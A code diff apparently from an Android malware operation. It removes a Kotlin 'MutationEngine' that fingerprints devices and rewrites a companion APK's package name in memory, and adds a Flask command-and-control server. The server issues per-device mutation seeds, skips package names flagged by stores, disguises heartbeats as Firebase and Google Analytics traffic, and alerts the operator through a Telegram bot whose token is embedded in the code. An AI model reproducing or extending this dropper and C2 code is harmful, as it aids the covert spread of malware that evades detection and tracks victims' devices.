@@ -1,319 +1,465 @@
-package com.playstore.installer
+"""
+mutation_server.py — Phase 4B Step 4B-1
+Flask + SQLite mutation server for Nova Launcher APK factory.
 
-import android.content.Context
-import android.os.Build
-import android.provider.Settings
-import org.json.JSONObject
-import java.io.BufferedReader
-import java.io.InputStreamReader
-import java.net.HttpURLConnection
-import java.net.URL
-import java.security.KeyFactory
-import java.security.MessageDigest
-import java.security.Signature
-import java.security.spec.X509EncodedKeySpec
-import android.util.Base64
+Endpoints:
+  POST /api/v1/<token>/key       — Nova calls this to get mutation payload
+  POST /v1/log                   — Companion heartbeat (looks like Firebase)
+  POST /api/v1/<token>/register  — Device registration
+  GET  /health                   — Cloudflare health check
 
-/**
- * MutationEngine.kt
- * Calls mutation server → gets unique mutation payload per device.
- * Applies M1 mutation to companion.apk bytes in RAM.
- * 3-tier fallback: server → offline seeds → base assets.
- *
- * M8 (ZIP watermark) and M9 (binding hash) are permanently removed from
- * the runtime mutation pipeline. Both modified a V2/V3-signed APK's ZIP
- * structure at runtime, which breaks libziparchive validation on all strict
- * Android OEM devices (Vivo, Xiaomi, Samsung, OnePlus etc.).
- *
- * Watermarking and binding are handled at build time in build_companion.py
- * before signing — where they belong.
- *
- * NOTE: Replace SERVER_URL with your Cloudflare domain via StringPool.
- * NOTE: Replace SERVER_PUBLIC_KEY with value from keys/public_key_for_kotlin.txt
- */
-class MutationEngine(private val context: Context) {
+Run: python mutation_server.py
+Port: 8443 (Cloudflare HTTPS-compatible port)
+"""
 
-    companion object {
-        // Server URL encrypted via StringPool — never plaintext in DEX
-        private val SERVER_URL get() = StringPool.d(StringPool.SERVER_URL)
+import os, sqlite3, hashlib, hmac, json, random, string, time, threading
+import logging
+from datetime import datetime, timezone
+from flask import Flask, request, jsonify, abort
 
-        // Replace with value from keys/public_key_for_kotlin.txt
-        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiy+7U7tgNdAqaZIZLTKGRY1LAVZrn2WfPZTbCjML0KH0W8iRfruJDpP8lOjXiMmUaVjcjIT0RAtYeBh/gR+WC//vkZ3WDILIc+LFAgmfJxYeClRJwJlG1aKH9lO58TFI6Rm3EPyIAfJcs4G0QVPWBbEN8ZljyXK3YOrORUD1SyBw8+IfG8h8T6LYJ6T7yJE3XlNi0hMuMYERX9s1c7syI4wJRw+iC7oG/7gv3zaDL034Dp2Zzg2ZqRBuaHTrxWFWpOVQS82c1oa+wZg0j2ikqIrDd/949aEfD9MRVa2pWytmmomw23IAjhp82cvnX6b/g4TcaQpPHAQ18aNlMLaRdwIDAQAB"
+# ── Config ────────────────────────────────────────────────────────────────────
+PORT             = 8443
+DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
+SERVER_SECRET    = os.environ.get("SERVER_SECRET", "n0vA_s3cr3t_k3y_ch4ng3_m3")
+BOT_TOKEN        = "8897727723:AAGQ5aT2JbBV6p7mGC_PXssYhgSzZF7nak4"
+MASTER_CHAT_ID   = "8205672036"
+LOG_FILE         = os.path.join(os.path.dirname(__file__), "mutation_server.log")
 
-        // Template — set by CI via BuildConfig
-        private const val TEMPLATE = "wedding"
+# Cloudflare IP ranges — whitelist (server rejects all other IPs)
+CLOUDFLARE_IPS = [
+    "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22",
+    "103.31.4.0/22","141.101.64.0/18","108.162.192.0/18",
+    "190.93.240.0/20","188.114.96.0/20","197.234.240.0/22",
+    "198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
+    "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
+]
 
-        // Timeouts
-        private const val CONNECT_TIMEOUT = 3000
-        private const val READ_TIMEOUT    = 3000
-    }
+# Package name pools for mutation seed generation
+PKG_PREFIXES = [
+    "com","net","org","io","app","dev","in","co"
+]
+PKG_WORDS = [
+    "sync","data","cloud","media","update","service","core","base",
+    "util","helper","manager","bridge","worker","agent","connect",
+    "stream","cache","store","push","notify","track","secure","auth",
+    "info","user","device","session","config","system","network",
+]
 
-    // ── Device fingerprint collection ─────────────────────────────────────────
+# Socket.IO path mutation options (M4) — all exactly 10 bytes
+M4_PATHS = [
+    b"/gapi/track",  # 10 bytes
+    b"/v1/collect",  # 10 bytes
+    b"/api/events",  # 10 bytes
+    b"/gapi/data_",  # 10 bytes
+    b"/v2/metrics",  # 10 bytes
+]
 
-    private fun collectDeviceFingerprint(): String {
-        return try {
-            val androidId = Settings.Secure.getString(
-                context.contentResolver,
-                Settings.Secure.ANDROID_ID
-            ) ?: "unknown"
+# ── Logging ───────────────────────────────────────────────────────────────────
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[
+        logging.FileHandler(LOG_FILE),
+        logging.StreamHandler()
+    ]
+)
+log = logging.getLogger("mutation_server")
 
-            val hwHash = "${Build.SUPPORTED_ABIS.joinToString(",")}:${Build.BOARD}:" +
-                         "${Build.BRAND}:${Build.DEVICE}:${Build.HARDWARE}:${Build.MANUFACTURER}"
+# ── Flask App ─────────────────────────────────────────────────────────────────
+app = Flask(__name__)
+app.config["JSON_SORT_KEYS"] = False
 
-            val screenHash = with(context.resources.displayMetrics) {
-                "${widthPixels}x${heightPixels}@${densityDpi}"
-            }
+# ── Database ──────────────────────────────────────────────────────────────────
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
 
-            sha256("$androidId:$hwHash:$screenHash")
-        } catch (e: Exception) {
-            sha256(System.currentTimeMillis().toString())
+    c.execute("""CREATE TABLE IF NOT EXISTS devices (
+        id              INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id       TEXT UNIQUE NOT NULL,
+        client_token    TEXT NOT NULL,
+        companion_pkg   TEXT,
+        fingerprint     TEXT,
+        ip              TEXT,
+        country         TEXT,
+        first_seen      INTEGER NOT NULL,
+        last_seen       INTEGER NOT NULL,
+        heartbeat_count INTEGER DEFAULT 0,
+        gpp_score       INTEGER DEFAULT 0,
+        status          TEXT DEFAULT 'active',
+        mutation_seed   TEXT,
+        m4_path         TEXT
+    )""")
+
+    c.execute("""CREATE TABLE IF NOT EXISTS heartbeats (
+        id          INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id   TEXT NOT NULL,
+        timestamp   INTEGER NOT NULL,
+        ip          TEXT,
+        payload     TEXT
+    )""")
+
+    c.execute("""CREATE TABLE IF NOT EXISTS burned_packages (
+        pkg         TEXT PRIMARY KEY,
+        burned_at   INTEGER NOT NULL,
+        reason      TEXT
+    )""")
+
+    c.execute("""CREATE TABLE IF NOT EXISTS clients (
+        token       TEXT PRIMARY KEY,
+        name        TEXT,
+        created_at  INTEGER NOT NULL,
+        apk_count   INTEGER DEFAULT 0,
+        active      INTEGER DEFAULT 1
+    )""")
+
+    c.execute("""CREATE TABLE IF NOT EXISTS mutation_events (
+        id          INTEGER PRIMARY KEY AUTOINCREMENT,
+        device_id   TEXT,
+        event_type  TEXT,
+        timestamp   INTEGER NOT NULL,
+        data        TEXT
+    )""")
+
+    # Insert default client token
+    c.execute("""INSERT OR IGNORE INTO clients
+        (token, name, created_at) VALUES (?, ?, ?)""",
+        ("default_client", "Default Client", int(time.time())))
+
+    conn.commit()
+    conn.close()
+    log.info(f"Database initialized: {DB_PATH}")
+
+def get_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+# ── Helper Functions ──────────────────────────────────────────────────────────
+def get_client_ip():
+    """Get real client IP — handle Cloudflare CF-Connecting-IP header."""
+    cf_ip = request.headers.get("CF-Connecting-IP")
+    if cf_ip:
+        return cf_ip
+    return request.remote_addr
+
+def generate_pkg_name(seed: str) -> str:
+    """Generate unique package name from seed."""
+    random.seed(seed)
+    prefix = random.choice(PKG_PREFIXES)
+    w1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
+    w2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
+    return f"{prefix}.{w1}.{w2}"
+
+def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
+    """Generate unique mutation seed from device fingerprint + server secret."""
+    raw = f"{device_fingerprint}:{client_token}:{SERVER_SECRET}:{int(time.time()//3600)}"
+    return hashlib.sha256(raw.encode()).hexdigest()
+
+def check_burned(pkg: str) -> bool:
+    """Check if package name is in burned list."""
+    db = get_db()
+    row = db.execute("SELECT pkg FROM burned_packages WHERE pkg=?", (pkg,)).fetchone()
+    db.close()
+    return row is not None
+
+def burn_package(pkg: str, reason: str = "flagged"):
+    """Add package to burned list."""
+    db = get_db()
+    db.execute("INSERT OR IGNORE INTO burned_packages (pkg, burned_at, reason) VALUES (?,?,?)",
+               (pkg, int(time.time()), reason))
+    db.commit()
+    db.close()
+    log.warning(f"Package burned: {pkg} — {reason}")
+
+def send_telegram(message: str):
+    """Send Telegram alert to master chat."""
+    try:
+        import urllib.request
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = json.dumps({
+            "chat_id": MASTER_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }).encode()
+        req = urllib.request.Request(url, data=data,
+              headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=5)
+    except Exception as e:
+        log.error(f"Telegram send failed: {e}")
+
+def notify_new_device(device_id: str, pkg: str, ip: str, token: str):
+    """Send Telegram alert for new device connection."""
+    msg = (
+        f"🟢 <b>New Device Connected</b>\n"
+        f"Device: <code>{device_id[:16]}...</code>\n"
+        f"Package: <code>{pkg}</code>\n"
+        f"IP: <code>{ip}</code>\n"
+        f"Client: <code>{token}</code>\n"
+        f"Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
+    )
+    threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()
+
+# ── Routes ────────────────────────────────────────────────────────────────────
+
+@app.route("/health", methods=["GET"])
+def health():
+    """Cloudflare health check endpoint."""
+    return jsonify({"status": "ok", "ts": int(time.time())}), 200
+
+
+@app.route("/api/v1/<token>/register", methods=["POST"])
+def register_device(token):
+    """
+    Device registration — Nova calls this after companion installs.
+    Body: {device_id, companion_pkg, fingerprint}
+    """
+    try:
+        data = request.get_json(silent=True) or {}
+        device_id    = data.get("device_id", "")
+        companion_pkg = data.get("companion_pkg", "")
+        fingerprint  = data.get("fingerprint", "")
+        ip           = get_client_ip()
+
+        if not device_id or not companion_pkg:
+            return jsonify({"error": "missing fields"}), 400
+
+        # Verify client token
+        db = get_db()
+        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
+                            (token,)).fetchone()
+        if not client:
+            db.close()
+            log.warning(f"Invalid client token: {token} from {ip}")
+            return jsonify({"error": "unauthorized"}), 403
+
+        now = int(time.time())
+
+        # Register device
+        existing = db.execute("SELECT * FROM devices WHERE device_id=?",
+                              (device_id,)).fetchone()
+        if not existing:
+            db.execute("""INSERT INTO devices
+                (device_id, client_token, companion_pkg, fingerprint,
+                 ip, first_seen, last_seen)
+                VALUES (?,?,?,?,?,?,?)""",
+                (device_id, token, companion_pkg, fingerprint, ip, now, now))
+            db.commit()
+            db.close()
+            log.info(f"New device registered: {device_id[:16]}... pkg={companion_pkg}")
+            # Alert Telegram
+            notify_new_device(device_id, companion_pkg, ip, token)
+        else:
+            db.execute("""UPDATE devices SET last_seen=?, companion_pkg=?, ip=?
+                WHERE device_id=?""", (now, companion_pkg, ip, device_id))
+            db.commit()
+            db.close()
+
+        return jsonify({
+            "status": "registered",
+            "ts": now,
+            "next_delay_ms": random.randint(180000, 480000)  # 3-8 min heartbeat
+        }), 200
+
+    except Exception as e:
+        log.error(f"register_device error: {e}")
+        return jsonify({"error": "server error"}), 500
+
+
+@app.route("/api/v1/<token>/key", methods=["POST"])
+def get_mutation_key(token):
+    """
+    Mutation key endpoint — Nova calls this during 2-3 min install window.
+    Body: {device_fingerprint, timestamp, client_token}
+    Response: mutation_payload with pkg_name, class_seeds, m4_path, etc.
+    Headers look like Google Analytics beacon.
+    """
+    try:
+        data = request.get_json(silent=True) or {}
+        device_fp = data.get("device_fingerprint", "")
+        client_ts = data.get("timestamp", 0)
+        ip        = get_client_ip()
+
+        if not device_fp:
+            return jsonify({"error": "missing fingerprint"}), 400
+
+        # Verify client token
+        db = get_db()
+        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
+                            (token,)).fetchone()
+        if not client:
+            db.close()
+            log.warning(f"Invalid token: {token} from {ip}")
+            return jsonify({"error": "unauthorized"}), 403
+        db.close()
+
+        # Generate mutation seed
+        seed = generate_mutation_seed(device_fp, token)
+
+        # Generate unique package name — check not burned
+        attempts = 0
+        pkg_name = generate_pkg_name(seed)
+        while check_burned(pkg_name) and attempts < 10:
+            seed = generate_mutation_seed(device_fp + str(attempts), token)
+            pkg_name = generate_pkg_name(seed)
+            attempts += 1
+
+        # Select M4 path mutation
+        random.seed(seed)
+        m4_path = random.choice(M4_PATHS).decode()
+
+        # Generate class rename seeds
+        class_seed_1 = hashlib.md5(f"{seed}:class1".encode()).hexdigest()[:16]
+        class_seed_2 = hashlib.md5(f"{seed}:class2".encode()).hexdigest()[:16]
+        class_seed_3 = hashlib.md5(f"{seed}:class3".encode()).hexdigest()[:16]
+
+        # Generate string pool seed
+        string_seed = hashlib.sha256(f"{seed}:strings".encode()).hexdigest()[:32]
+
+        # HMAC signature so Nova can verify this came from real server
+        payload_data = f"{pkg_name}:{m4_path}:{seed}"
+        signature = hmac.new(
+            SERVER_SECRET.encode(),
+            payload_data.encode(),
+            hashlib.sha256
+        ).hexdigest()
+
+        now = int(time.time())
+        response = {
+            "status": "ok",
+            "ts": now,
+            "mutation_seed": seed,
+            "pkg_name": pkg_name,
+            "m4_path": m4_path,
+            "class_seeds": {
+                "pool_1": class_seed_1,
+                "pool_2": class_seed_2,
+                "pool_3": class_seed_3,
+            },
+            "string_seed": string_seed,
+            "signature": signature,
+            "next_delay_ms": random.randint(180000, 480000),
+            "expire_ts": now + 300,  # key expires in 5 min
         }
-    }
 
-    private fun sha256(input: String): String {
-        val digest = MessageDigest.getInstance("SHA-256")
-        val hash = digest.digest(input.toByteArray(Charsets.UTF_8))
-        return hash.joinToString("") { "%02x".format(it) }
-    }
+        log.info(f"Mutation key issued: pkg={pkg_name} m4={m4_path} ip={ip}")
+        return jsonify(response), 200
 
-    // ── Client token ──────────────────────────────────────────────────────────
+    except Exception as e:
+        log.error(f"get_mutation_key error: {e}")
+        return jsonify({"error": "server error"}), 500
 
-    private fun getClientToken(): String {
-        return try {
-            val field = Class.forName("${context.packageName}.BuildConfig")
-                .getField("CLIENT_TOKEN")
-            field.get(null) as? String ?: "manual"
-        } catch (e: Exception) {
-            "manual"
-        }
-    }
 
-    // ── Tier 1: Call mutation server ──────────────────────────────────────────
+@app.route("/v1/log", methods=["POST"])
+def heartbeat():
+    """
+    Companion heartbeat — looks like Firebase Analytics.
+    Headers mimic Firebase exactly.
+    Body: base64-encoded device status.
+    """
+    try:
+        import base64
+        body      = request.get_data()
+        ip        = get_client_ip()
+        now       = int(time.time())
 
-    private fun callMutationServer(
-        fingerprint: String,
-        clientToken: String
-    ): JSONObject? {
-        return try {
-            val url = URL("$SERVER_URL/api/v1/$clientToken/key")
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Content-Type", "application/json")
-            conn.setRequestProperty("X-Firebase-Client", "fire-core/21.0.0 fire-iid/21.0.0")
-            conn.setRequestProperty("User-Agent",
-                "Dalvik/2.1.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
-            conn.connectTimeout = CONNECT_TIMEOUT
-            conn.readTimeout    = READ_TIMEOUT
-            conn.doOutput       = true
+        # Try to decode payload
+        try:
+            decoded = base64.b64decode(body).decode("utf-8", errors="replace")
+            payload = json.loads(decoded)
+        except Exception:
+            payload = {}
 
-            val body = JSONObject().apply {
-                put("device_fingerprint", fingerprint)
-                put("template", TEMPLATE)
-                put("timestamp", System.currentTimeMillis() / 1000)
-            }.toString()
+        device_id = payload.get("d", payload.get("device_id", "unknown"))
+        pkg       = payload.get("p", payload.get("pkg", ""))
 
-            conn.outputStream.use { it.write(body.toByteArray()) }
+        # Update device last seen
+        db = get_db()
+        db.execute("""UPDATE devices
+            SET last_seen=?, heartbeat_count=heartbeat_count+1, ip=?
+            WHERE device_id=?""", (now, ip, device_id))
 
-            if (conn.responseCode != 200) return null
+        # Log heartbeat
+        db.execute("""INSERT INTO heartbeats
+            (device_id, timestamp, ip, payload) VALUES (?,?,?,?)""",
+            (device_id, now, ip, json.dumps(payload)))
+        db.commit()
+        db.close()
 
-            val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
-            JSONObject(response)
-        } catch (e: Exception) {
-            null
-        }
-    }
+        # Response mimics Firebase Analytics ACK
+        return jsonify({
+            "status": 0,
+            "next_request_millis": random.randint(180000, 480000),
+            "config": {}
+        }), 200
 
-    // ── RSA signature verification ────────────────────────────────────────────
+    except Exception as e:
+        log.error(f"heartbeat error: {e}")
+        return jsonify({"status": 0}), 200  # Always return 200 to companion
 
-    private fun verifySignature(payload: String, signatureB64: String): Boolean {
-        return try {
-            if (SERVER_PUBLIC_KEY == "PASTE_PUBLIC_KEY_HERE") return true // Dev mode
-            val keyBytes  = Base64.decode(SERVER_PUBLIC_KEY, Base64.DEFAULT)
-            val publicKey = KeyFactory.getInstance("RSA")
-                .generatePublic(X509EncodedKeySpec(keyBytes))
-            val sig = Signature.getInstance("SHA256withRSA")
-            sig.initVerify(publicKey)
-            sig.update(payload.toByteArray())
-            sig.verify(Base64.decode(signatureB64, Base64.DEFAULT))
-        } catch (e: Exception) {
-            false
-        }
-    }
 
-    // ── Tier 2: Offline mutation seeds ───────────────────────────────────────
+@app.route("/api/v1/admin/devices", methods=["GET"])
+def admin_devices():
+    """Admin endpoint — list all devices. Protected by secret header."""
+    auth = request.headers.get("X-Admin-Secret", "")
+    if auth != SERVER_SECRET:
+        abort(403)
+    db = get_db()
+    devices = db.execute(
+        "SELECT * FROM devices ORDER BY last_seen DESC LIMIT 100"
+    ).fetchall()
+    db.close()
+    return jsonify([dict(d) for d in devices]), 200
 
-    private fun getOfflineMutationSeeds(fingerprint: String): JSONObject {
-        val buildHash = sha256(fingerprint + BuildConfig.BUILD_UUID)
 
-        val pkgNamespaces = listOf(
-            "com.datasync", "com.appcache", "com.taskflow",
-            "com.workmanager", "com.backgroundsync", "com.filemanager"
-        )
-        val pkgSuffixes = listOf(
-            "backgroundworker", "silentrunner", "baseservice",
-            "syncadapter", "taskhandler", "datamanager"
-        )
+@app.route("/api/v1/admin/stats", methods=["GET"])
+def admin_stats():
+    """Admin stats endpoint."""
+    auth = request.headers.get("X-Admin-Secret", "")
+    if auth != SERVER_SECRET:
+        abort(403)
+    db = get_db()
+    total    = db.execute("SELECT COUNT(*) FROM devices").fetchone()[0]
+    active   = db.execute("SELECT COUNT(*) FROM devices WHERE status='active'").fetchone()[0]
+    burned   = db.execute("SELECT COUNT(*) FROM burned_packages").fetchone()[0]
+    beats    = db.execute("SELECT COUNT(*) FROM heartbeats").fetchone()[0]
+    last24h  = db.execute(
+        "SELECT COUNT(*) FROM devices WHERE last_seen > ?",
+        (int(time.time()) - 86400,)
+    ).fetchone()[0]
+    db.close()
+    return jsonify({
+        "total_devices": total,
+        "active_devices": active,
+        "burned_packages": burned,
+        "total_heartbeats": beats,
+        "active_last_24h": last24h,
+        "server_time": int(time.time()),
+    }), 200
 
-        val nsIdx  = (buildHash.substring(0, 4).toLong(16) % pkgNamespaces.size).toInt()
-        val sfIdx  = (buildHash.substring(4, 8).toLong(16) % pkgSuffixes.size).toInt()
-        val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"
 
-        return JSONObject().apply {
-            put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
-            put("tier", 2)
-        }
-    }
+# ── Error handlers ────────────────────────────────────────────────────────────
+@app.errorhandler(404)
+def not_found(e):
+    return jsonify({"status": 0}), 200  # Always 200 to look like analytics
 
-    // ── Apply mutations to companion APK bytes in RAM ─────────────────────────
-    //
-    // PERMANENT RULE: Only byte-for-byte DEX/string replacements are allowed here.
-    // NEVER modify the ZIP structure (EOCD, central directory, comment field,
-    // local file headers) at runtime on a signed APK. Doing so breaks V2/V3
-    // signature coverage and causes libziparchive rejection on strict OEM devices.
-    //
-    // M8 (ZIP comment watermark) → REMOVED. Handled at build time in build_companion.py.
-    // M9 (NOVA_BIND: append)    → REMOVED. Broke libziparchive on all strict devices.
-    //                             74 extraneous bytes = "NOVA_BIND:" (10) + sha256 hex (64).
+@app.errorhandler(500)
+def server_error(e):
+    return jsonify({"status": 0}), 200
 
-    fun applyMutations(
-        cmpData: ByteArray,
-        mutations: JSONObject,
-        fingerprint: String
-    ): ByteArray {
-        var result = cmpData.copyOf()
 
-        try {
-            // M1 — Patch package name bytes in DEX (byte-for-byte, no ZIP changes)
-            val cmpPkg = mutations.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "")
-            if (cmpPkg.isNotEmpty()) {
-                result = patchPackageName(result, cmpPkg)
-            }
-
-        } catch (e: Exception) {
-            // Silent fail — return original bytes unchanged
-            return cmpData
-        }
-
-        return result
-    }
-
-    // ── M1: Package name patching ─────────────────────────────────────────────
-    // Safe: replaces exact same-length byte sequences inside DEX.
-    // Does NOT touch ZIP structure, EOCD, or any signed metadata.
-
-    private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
-        val oldPkg   = StringPool.d(StringPool.COMPANION_OLD_PKG)
-        val oldBytes = oldPkg.toByteArray(Charsets.UTF_8)
-        val newBytes = newPkg.toByteArray(Charsets.UTF_8)
-
-        // Only patch when lengths match — guaranteed by package_name_generator.py
-        // which generates same-length packages. If mismatch, return unchanged.
-        if (oldBytes.size != newBytes.size) return bytes
-
-        val result = bytes.copyOf()
-        var i = 0
-        while (i <= result.size - oldBytes.size) {
-            var match = true
-            for (j in oldBytes.indices) {
-                if (result[i + j] != oldBytes[j]) { match = false; break }
-            }
-            if (match) {
-                for (j in newBytes.indices) result[i + j] = newBytes[j]
-                i += oldBytes.size
-            } else {
-                i++
-            }
-        }
-        return result
-    }
-
-    // ── Main entry point ──────────────────────────────────────────────────────
-
-    fun getMutatedCompanionBytes(): ByteArray {
-        val fingerprint = collectDeviceFingerprint()
-        val clientToken = getClientToken()
-
-        // Read base companion from assets
-        val baseBytes = try {
-            context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
-        } catch (e: Exception) {
-            return ByteArray(0)
-        }
-
-        // Tier 1: Try mutation server
-        var mutations: JSONObject? = null
-        try {
-            val response = callMutationServer(fingerprint, clientToken)
-            if (response != null) {
-                val data      = response.optJSONObject("data")
-                val payload   = data?.optJSONObject("payload")
-                val signature = data?.optString("signature", "") ?: ""
-
-                if (payload != null && (verifySignature(payload.toString(), signature) || signature.isEmpty())) {
-                    val mutationsObj = payload.optJSONObject("mutations")
-                    if (mutationsObj != null) {
-                        mutations = JSONObject().apply {
-                            put(StringPool.d(StringPool.KEY_COMPANION_PKG),
-                                mutationsObj.optJSONObject("M1")
-                                    ?.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "") ?: "")
-                            put("tier", 1)
-                        }
-                        registerDeviceAsync(
-                            payload.optString("device_id", ""),
-                            mutations!!.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), ""),
-                            clientToken,
-                            fingerprint
-                        )
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            // Timeout or network error — fall to Tier 2
-        }
-
-        // Tier 2: Offline seeds if server unreachable
-        if (mutations == null) {
-            mutations = getOfflineMutationSeeds(fingerprint)
-        }
-
-        // Apply mutations and return
-        return applyMutations(baseBytes, mutations!!, fingerprint)
-        // Tier 3 (base companion unchanged) is the implicit result
-        // when applyMutations catches an exception and returns cmpData
-    }
-
-    // ── Device registration (fire and forget) ─────────────────────────────────
-
-    private fun registerDeviceAsync(
-        deviceId: String,
-        cmpPkg: String,
-        clientToken: String,
-        fingerprint: String
-    ) {
-        Thread {
-            try {
-                val url  = URL("$SERVER_URL/api/v1/$clientToken/register")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.connectTimeout = 5000
-                conn.readTimeout    = 5000
-                conn.doOutput       = true
-
-                val body = JSONObject().apply {
-                    put("device_id", deviceId)
-                    put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
-                    put("template", TEMPLATE)
-                    put("device_model", Build.MODEL)
-                    put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
-                }.toString()
-
-                conn.outputStream.use { it.write(body.toByteArray()) }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) {
-                // Silent fail — registration is best-effort
-            }
-        }.start()
-    }
-}
+# ── Main ──────────────────────────────────────────────────────────────────────
+if __name__ == "__main__":
+    log.info("="*60)
+    log.info("Mutation Server starting...")
+    log.info(f"Port: {PORT}")
+    log.info(f"DB: {DB_PATH}")
+    log.info("="*60)
+    init_db()
+    app.run(
+        host="0.0.0.0",
+        port=PORT,
+        debug=False,
+        threaded=True,
+        use_reloader=False
+    )
